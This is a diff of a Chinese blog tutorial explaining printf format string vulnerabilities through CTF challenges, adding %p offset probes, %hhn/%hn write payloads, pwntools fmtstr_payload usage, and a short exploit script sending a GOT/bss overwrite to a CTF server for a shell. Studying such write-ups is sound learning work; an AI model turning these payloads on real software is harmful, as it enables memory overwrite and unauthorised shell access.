@@ -79,15 +79,15 @@
 
 
 
-<meta name="description" content="输出函数:printf漏洞类型:比如char c[100];scanf(“%s”,&amp;c);printf(c);当输入的是正常的字母比如a-z,A-Z,0-9时，printf会正常的输出输入的内容，而当输入的是格式化字符串是%s,%p,%x······时，程序会泄露printf函数栈上对应的内容，如果控制输入的内容可以达到泄露got表，使程序异常停止等操作，接下来对各格式化字符串以及利用方式">
+<meta name="description" content="hhn表示1个字节，hn表示2个，n表示4个输出函数:printf漏洞类型:比如char c[100];scanf(“%s”,&amp;c);printf(c);当输入的是正常的字母比如a-z,A-Z,0-9时，printf会正常的输出输入的内容，而当输入的是格式化字符串是%s,%p,%x······时，程序会泄露printf函数栈上对应的内容，如果控制输入的内容可以达到泄露got表，使程序异常停">
 <meta property="og:type" content="website">
 <meta property="og:title" content="格式化字符串漏洞详解">
 <meta property="og:url" content="http://example.com/drafts/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3.html">
 <meta property="og:site_name" content="Archerの博客">
-<meta property="og:description" content="输出函数:printf漏洞类型:比如char c[100];scanf(“%s”,&amp;c);printf(c);当输入的是正常的字母比如a-z,A-Z,0-9时，printf会正常的输出输入的内容，而当输入的是格式化字符串是%s,%p,%x······时，程序会泄露printf函数栈上对应的内容，如果控制输入的内容可以达到泄露got表，使程序异常停止等操作，接下来对各格式化字符串以及利用方式">
+<meta property="og:description" content="hhn表示1个字节，hn表示2个，n表示4个输出函数:printf漏洞类型:比如char c[100];scanf(“%s”,&amp;c);printf(c);当输入的是正常的字母比如a-z,A-Z,0-9时，printf会正常的输出输入的内容，而当输入的是格式化字符串是%s,%p,%x······时，程序会泄露printf函数栈上对应的内容，如果控制输入的内容可以达到泄露got表，使程序异常停">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2021-04-12T13:50:00.000Z">
-<meta property="article:modified_time" content="2021-05-15T21:17:17.016Z">
+<meta property="article:modified_time" content="2021-06-05T03:01:53.499Z">
 <meta property="article:author" content="Archer">
 <meta name="twitter:card" content="summary">
 
@@ -265,12 +265,14 @@
       <div class="post-body">
         
         
-          <p>输出函数:printf<br>漏洞类型:比如char c[100];scanf(“%s”,&amp;c);printf(c);<br>当输入的是正常的字母比如a-z,A-Z,0-9时，printf会正常的输出输入的内容，而当输入的是格式化字符串是%s,%p,%x······时，程序会泄露printf函数栈上对应的内容，如果控制输入的内容可以达到泄露got表，使程序异常停止等操作，接下来对各格式化字符串以及利用方式进行详细的解释<br>    1.%p，输出16进制数据带0x<br>    2.%x，也是输出16进制数据，不带0x(可以通过%p或者%x)<br>    3.%s输出栈上变量对应的字符串<br>    4.%n将之前已经输出的字符串个数赋给对应指针指向的变量<br>上述格式化串只是最基本的格式，还有高级的格式就是在p，x等前加上$,$的作用相当于是指定%p以及%x，输出的位置，%n也差不多，如%2$p输出的就是偏移2处的地址<br>调用printf函数对应的栈<br>EBP<br>返回地址<br>format<br>偏移1<br>偏移2<br>偏移3<br>通过输入aaaa-%p-%p-%p-%p-%p-%p-%p,可以确定输入数据的偏移量<br>一.覆盖变量的值(小数字)<br>原理：通过输入对应变量的地址到栈上，然后通过%$n，即可修改变量的值。<br>例题攻防世界CGfsb<br>程序流程十分简单，主程序中有个pwnme变量，pwnme变量为8，即能得到flag 第一次输入无意义，第二次输入可以输入aaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p,来看输入数据在栈上得偏移量，<br>这道题测得是10,payload为p32(pwnme_addr)+’aaaa%10$n’</p>
-<p>待补充学堆去了</p>
-<p>二.泄露got表或者变量的地址<br>原理：通过%$s可以输出栈上指针所指向的字符串<br>利用方式:泄露got表后，<br>列题：ctfwik</p>
-<p>三.改got表</p>
-<p>四.改地址</p>
-<p>五.bss段上的格式化字符串漏洞</p>
+          <p>hhn表示1个字节，hn表示2个，n表示4个<br>输出函数:printf<br>漏洞类型:比如char c[100];scanf(“%s”,&amp;c);printf(c);<br>当输入的是正常的字母比如a-z,A-Z,0-9时，printf会正常的输出输入的内容，而当输入的是格式化字符串是%s,%p,%x······时，程序会泄露printf函数栈上对应的内容，如果控制输入的内容可以达到泄露got表，使程序异常停止等操作，接下来对各格式化字符串以及利用方式进行详细的解释<br>    1.%p，输出16进制数据带0x<br>    2.%x，也是输出16进制数据，不带0x(可以通过%p或者%x)<br>    3.%s输出栈上变量对应的字符串<br>    4.%n将之前已经输出的字符串个数赋给对应指针指向的变量<br>上述格式化串只是最基本的格式，还有高级的格式就是在p，x等前加上$,$的作用相当于是指定%p以及%x，输出的位置，%n也差不多，如%2$p输出的就是偏移2处的地址<br>调用printf函数对应的栈<br>EBP<br>返回地址<br>format<br>偏移1<br>偏移2<br>偏移3<br>通过输入aaaa-%p-%p-%p-%p-%p-%p-%p,可以确定输入数据的偏移量<br>一.覆盖变量的值(小数字)<br>原理：通过输入对应变量的地址到栈上，然后通过%$n，即可修改变量的值。<br>例题攻防世界CGfsb<br>程序流程十分简单，主程序中有个pwnme变量，pwnme变量为8，即能得到flag 第一次输入无意义，第二次输入可以输入aaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p,来看输入数据在栈上得偏移量，<br>这道题测得是10,payload为p32(pwnme_addr)+’aaaa%10$n’</p>
+<p>二.泄露got表或者变量的地址<br>原理：通过%$s可以输出栈上指针所指向的字符串<br>当栈上存在某函数的got表值时，使用%$s输出该地址对应的值，就能够泄露got表<br>例题buu axb_2019_fmt32</p>
+<p>三.改got表、改地址<br>例题：攻防世界进阶区 实时数据监测<br>通过hhn一字节一字节的或者两字节改数据，将0x0804A048对应处的值改为0x02223322即可getshell,经过测试偏移为12<br>payload=p32(bss_ad)+p32(bss_ad+1)+p32(bss_ad+2)+”%”+str(0x22-12)<br>payload+=”c%12$hhn”+”%”+str(0x33-0x22)+”c%13$hhn”<br>payload+=”%”+str(0x222-0x33)+”c%14$hn”<br>十分简单</p>
+<p>四.bss段上的格式化字符串漏洞</p>
+<p>pwntools中的fmstr_payload使用：<br>fmtstr_payload(offset, writes, numbwritten=0, write_size=’byte’)<br>第一个参数表示格式化字符串的偏移；<br>第二个参数表示需要利用%n写入的数据，采用字典形式，我们要将printf的GOT数据改为system函数地址，就写成{printfGOT: systemAddress}；本题是将0804a048处改为0x2223322<br>第三个参数表示已经输出的字符个数，这里没有，为0，采用默认值即可；<br>第四个参数表示写入方式，是按字节（byte）、按双字节（short）还是按四字节（int），对应着hhn、hn和n，默认值是byte，即按hhn写。<br>fmtstr_payload函数返回的就是payload<br>例题：攻防世界进阶区 实时数据监测<br>根据题目要求需要将<br>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&quot;111.200.241.244&quot;</span>,<span class="number">61697</span>)</span><br><span class="line">payload=fmtstr_payload(<span class="number">12</span>,&#123;<span class="number">0x0804A048</span>:<span class="number">0x2223322</span>&#125;)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">payload=p32(bss_ad)+p32(bss_ad+1)+p32(bss_ad+2)+&quot;%&quot;+str(0x22-12)</span></span><br><span class="line"><span class="string">payload+=&quot;c%12$hhn&quot;+&quot;%&quot;+str(0x33-0x22)+&quot;c%13$hhn&quot;</span></span><br><span class="line"><span class="string">payload+=&quot;%&quot;+str(0x222-0x33)+&quot;c%14$hn&quot;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>当自己手写payload时，往往需要使用移位运算符来得到一个地址的一些位<br>sys_high=（sys_ad&gt;&gt;16）&amp; 0xff<br>sys_low= sys_ad &amp; 0xff<br>&amp;运算符表示与  1-1 为1 其他为0<br>^运算符表示相同为0 不相同为1<br>|运算符表示有1为1</p>
 
         
       </div>
